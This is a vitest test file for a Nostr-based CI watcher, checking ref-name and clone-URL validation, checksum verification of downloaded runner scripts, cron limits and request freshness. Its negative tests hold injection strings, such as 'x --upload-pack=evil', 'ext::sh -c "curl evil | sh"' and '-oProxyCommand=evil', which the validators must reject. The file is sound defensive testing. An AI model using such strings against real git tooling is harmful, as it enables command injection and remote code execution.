import {describe, expect, it} from 'vitest'
import type {NostrEvent} from 'nostr-tools'
import {isFreshRequest, REQUEST_MAX_AGE_SECONDS} from '../src/cvm/server.js'
import {WatcherDb} from '../src/db/index.js'
import {buildRunnerArgs} from '../src/dispatch/blossom.js'
import {isAllowedCloneUrl, parseRepoAnnouncement, parseRepoState} from '../src/nostr/events.js'
import {selectDueSchedules} from '../src/triggers/cron.js'
import {diffRefs, isValidRefShortName} from '../src/triggers/refs.js'
import {resolveDefaultBranch} from '../src/watcher.js'

const OWNER = 'a'.repeat(64)
const COMMIT_A = '1'.repeat(40)
const COMMIT_B = '2'.repeat(40)

function event(partial: Partial<NostrEvent> & {kind: number; tags: string[][]}): NostrEvent {
  return {
    id: partial.id ?? 'e'.repeat(64),
    pubkey: partial.pubkey ?? OWNER,
    created_at: partial.created_at ?? 1_700_000_000,
    kind: partial.kind,
    tags: partial.tags,
    content: partial.content ?? '',
    sig: partial.sig ?? '0'.repeat(128),
  }
}

describe('ref-name validation (git check-ref-format)', () => {
  it('accepts ordinary branch and tag names', () => {
    for (const name of ['main', 'release/1.x', 'v1.2.0', 'feature/a-b_c', 'a.b', 'x/y/z']) {
      expect([name, isValidRefShortName(name)]).toEqual([name, true])
    }
  })

  it('refuses everything the runner script could word-split or git could misparse', () => {
    const bad = [
      '',
      '-x', // would read as a git option
      'x --upload-pack=evil', // space: word-splits in `git clone $CLONE_ARGS`
      'x' + String.fromCharCode(9) + 'y',
      'x' + String.fromCharCode(0) + 'y',
      'x~1', 'x^1', 'x:y', 'x?y', 'x*y', 'x[y', 'x\\y',
      'a..b', 'a//b', '/x', 'x/', '.x', 'x.', 'x.lock', 'a/.b', 'x@{1}', '@',
    ]
    for (const name of bad) {
      expect([JSON.stringify(name), isValidRefShortName(name)]).toEqual([JSON.stringify(name), false])
    }
  })

  it('drops malformed refs at 30618 parse time', () => {
    const state = parseRepoState(
      event({
        kind: 30618,
        tags: [
          ['d', 'r'],
          ['refs/heads/main', COMMIT_A],
          ['refs/heads/x --upload-pack=evil', COMMIT_B],
          ['refs/tags/-v1', COMMIT_B],
        ],
      }),
      OWNER,
    )!
    expect(state.refs.map(ref => ref.ref)).toEqual(['refs/heads/main'])
  })
})

describe('clone url validation', () => {
  it('allows only credential-free network transports', () => {
    expect(isAllowedCloneUrl('https://example.com/repo.git')).toBe(true)
    expect(isAllowedCloneUrl('http://example.com/repo.git')).toBe(true)
    expect(isAllowedCloneUrl('git://example.com/repo.git')).toBe(true)

    expect(isAllowedCloneUrl('file:///var/lib/hive-ci-watcher/watcher.db')).toBe(false)
    expect(isAllowedCloneUrl('ssh://git@example.com/repo.git')).toBe(false)
    expect(isAllowedCloneUrl('git@example.com:repo.git')).toBe(false)
    expect(isAllowedCloneUrl('ext::sh -c "curl evil | sh"')).toBe(false)
    expect(isAllowedCloneUrl('-oProxyCommand=evil')).toBe(false)
    expect(isAllowedCloneUrl('https://example.com/re' + String.fromCharCode(10) + 'po.git')).toBe(false)
    expect(isAllowedCloneUrl('https://example.com/a b')).toBe(false)
  })

  it('filters them out of the announcement', () => {
    const parsed = parseRepoAnnouncement(
      event({
        kind: 30617,
        tags: [
          ['d', 'r'],
          ['clone', 'file:///etc', 'https://ok.example/repo.git', 'ext::evil'],
        ],
      }),
    )!
    expect(parsed.cloneUrls).toEqual(['https://ok.example/repo.git'])
  })
})

describe('runner args verify the download', () => {
  it('checks the sha256 before executing', () => {
    const hash = 'f'.repeat(64)
    const [flag, command] = buildRunnerArgs('https://blossom.example/' + hash, hash)
    expect(flag).toBe('-c')
    expect(command).toContain(`curl -fsSL "https://blossom.example/${hash}"`)
    expect(command).toContain(`${hash}  /tmp/run-workflow.sh`)
    expect(command).toMatch(/sha256sum -c --status/)
    expect(command).toMatch(/shasum -a 256 -c --status/)
    // The verify step sits between the download and the execution.
    expect(command!.indexOf('curl')).toBeLessThan(command!.indexOf('sha256sum'))
    expect(command!.indexOf('sha256sum')).toBeLessThan(command!.lastIndexOf('/tmp/run-workflow.sh'))
  })

  it('refuses a malformed hash rather than emitting an unverified command', () => {
    expect(() => buildRunnerArgs('https://x', 'nope')).toThrow(/64 hex/)
  })
})

describe('cron floor', () => {
  const ms = (iso: string) => Date.parse(iso)

  it('fires an every-minute cron at most every five minutes', () => {
    const lastFired = ms('2026-01-01T00:00:00Z') / 1000
    const schedules = [{cron: '* * * * *', lastFiredAt: lastFired}]
    expect(selectDueSchedules(schedules, ms('2026-01-01T00:04:59Z'))).toEqual([])
    expect(selectDueSchedules(schedules, ms('2026-01-01T00:05:00Z'))).toHaveLength(1)
  })

  it('does not delay a cron that is already slower than the floor', () => {
    const schedules = [{cron: '0 * * * *', lastFiredAt: ms('2026-01-01T00:00:00Z') / 1000}]
    expect(selectDueSchedules(schedules, ms('2026-01-01T01:00:00Z'))).toHaveLength(1)
  })
})

describe('ref tombstones', () => {
  const stateRef = (ref: string, commitId: string) => ({ref, commitId, refValue: commitId})

  it('reports a live ref as deleted once, then stays quiet', () => {
    const first = diffRefs([], [{ref: 'refs/heads/x', commitId: COMMIT_A, deletedAt: null}])
    expect(first.deleted).toEqual(['refs/heads/x'])

    const second = diffRefs([], [{ref: 'refs/heads/x', commitId: COMMIT_A, deletedAt: 123}])
    expect(second.deleted).toEqual([])
  })

  it('does not treat a ref reappearing at its old commit as a push', () => {
    // Maintainer A's 30618 omits the ref; maintainer B's includes it at the
    // commit we already built. Without the tombstone this is "new" and
    // re-dispatches on every alternation.
    const diff = diffRefs(
      [stateRef('refs/heads/x', COMMIT_A)],
      [{ref: 'refs/heads/x', commitId: COMMIT_A, deletedAt: 123}],
    )
    expect(diff.changed).toEqual([])
    expect(diff.unchanged).toEqual(['refs/heads/x'])
  })

  it('still treats a reappearance at a new commit as a push', () => {
    const diff = diffRefs(
      [stateRef('refs/heads/x', COMMIT_B)],
      [{ref: 'refs/heads/x', commitId: COMMIT_A, deletedAt: 123}],
    )
    expect(diff.changed.map(change => change.commitId)).toEqual([COMMIT_B])
  })

  it('round-trips through sqlite', () => {
    const db = new WatcherDb(':memory:')
    db.putRefState('r', 'refs/heads/x', COMMIT_A)
    db.tombstoneRefState('r', 'refs/heads/x')
    expect(db.getRefStates('r')[0]!.deletedAt).not.toBeNull()

    // A live write clears the tombstone.
    db.putRefState('r', 'refs/heads/x', COMMIT_B)
    expect(db.getRefStates('r')[0]).toMatchObject({commitId: COMMIT_B, deletedAt: null})
    db.close()
  })
})

describe('first-sight seeding', () => {
  it('starts every follow unseeded and records the seed once', () => {
    const db = new WatcherDb(':memory:')
    db.followRepo({repoAddr: 'r', repoOwner: OWNER, dTag: 'd', addedBy: OWNER})
    expect(db.getFollowedRepo('r')!.seededAt).toBeNull()

    db.seedRefStates('r', [
      {ref: 'refs/heads/main', commitId: COMMIT_A},
      {ref: 'refs/tags/v1', commitId: COMMIT_B},
    ])
    expect(db.getFollowedRepo('r')!.seededAt).not.toBeNull()
    expect(db.getRefStates('r')).toHaveLength(2)

    // Everything seeded is "unchanged" on the next diff — nothing dispatches.
    const diff = diffRefs(
      [
        {ref: 'refs/heads/main', commitId: COMMIT_A, refValue: COMMIT_A},
        {ref: 'refs/tags/v1', commitId: COMMIT_B, refValue: COMMIT_B},
      ],
      db.getRefStates('r'),
    )
    expect(diff.changed).toEqual([])
    db.close()
  })

  it('re-follow after unfollow seeds again instead of flooding', () => {
    const db = new WatcherDb(':memory:')
    db.followRepo({repoAddr: 'r', repoOwner: OWNER, dTag: 'd', addedBy: OWNER})
    db.seedRefStates('r', [{ref: 'refs/heads/main', commitId: COMMIT_A}])
    db.unfollowRepo('r')
    db.followRepo({repoAddr: 'r', repoOwner: OWNER, dTag: 'd', addedBy: OWNER})
    expect(db.getFollowedRepo('r')!.seededAt).toBeNull()
    expect(db.getRefStates('r')).toEqual([])
    db.close()
  })
})

describe('run history pruning', () => {
  it('keeps only the newest rows', () => {
    const db = new WatcherDb(':memory:')
    for (let index = 0; index < 10; index += 1) {
      db.recordRun({
        runId: String(index).padStart(64, '0'),
        repoAddr: 'r',
        ref: 'refs/heads/main',
        commitId: COMMIT_A,
        workflowPath: 'w.yml',
        runnerPubkey: OWNER,
        trigger: 'push',
        createdAt: 1_000 + index,
      })
    }
    expect(db.pruneRuns(3)).toBe(7)
    expect(db.recentRuns(100).map(run => run.createdAt)).toEqual([1_009, 1_008, 1_007])
    db.close()
  })
})

describe('default branch resolution without HEAD', () => {
  const state = (refs: string[]) =>
    ({
      defaultBranch: null,
      refs: refs.map(ref => ({ref, commitId: COMMIT_A, refValue: COMMIT_A})),
    }) as any

  it('prefers HEAD, then the recorded value, then main, then master, then the first branch', () => {
    expect(resolveDefaultBranch({...state(['refs/heads/x']), defaultBranch: 'dev'}, 'old')).toBe('dev')
    expect(resolveDefaultBranch(state(['refs/heads/x']), 'old')).toBe('old')
    expect(resolveDefaultBranch(state(['refs/heads/z', 'refs/heads/main']), null)).toBe('main')
    expect(resolveDefaultBranch(state(['refs/heads/z', 'refs/heads/master']), null)).toBe('master')
    expect(resolveDefaultBranch(state(['refs/heads/z', 'refs/heads/b', 'refs/tags/v1']), null)).toBe('b')
    expect(resolveDefaultBranch(state([]), null)).toBe('main')
  })
})

describe('request freshness', () => {
  const now = 1_800_000_000
  const caller = OWNER

  it('accepts a request stamped within the window by the same caller', () => {
    expect(isFreshRequest({created_at: now - 10, pubkey: OWNER}, caller, now)).toBe(true)
    expect(isFreshRequest({created_at: now + 10, pubkey: OWNER.toUpperCase()}, caller, now)).toBe(true)
  })

  it('refuses a replayed request from outside the window', () => {
    expect(isFreshRequest({created_at: now - REQUEST_MAX_AGE_SECONDS - 1, pubkey: OWNER}, caller, now)).toBe(false)
    expect(isFreshRequest({created_at: now + REQUEST_MAX_AGE_SECONDS + 1, pubkey: OWNER}, caller, now)).toBe(false)
  })

  it('fails closed without an event, a caller, or a matching signer', () => {
    expect(isFreshRequest(undefined, caller, now)).toBe(false)
    expect(isFreshRequest({created_at: now, pubkey: OWNER}, undefined, now)).toBe(false)
    expect(isFreshRequest({created_at: now, pubkey: 'b'.repeat(64)}, caller, now)).toBe(false)
  })
})
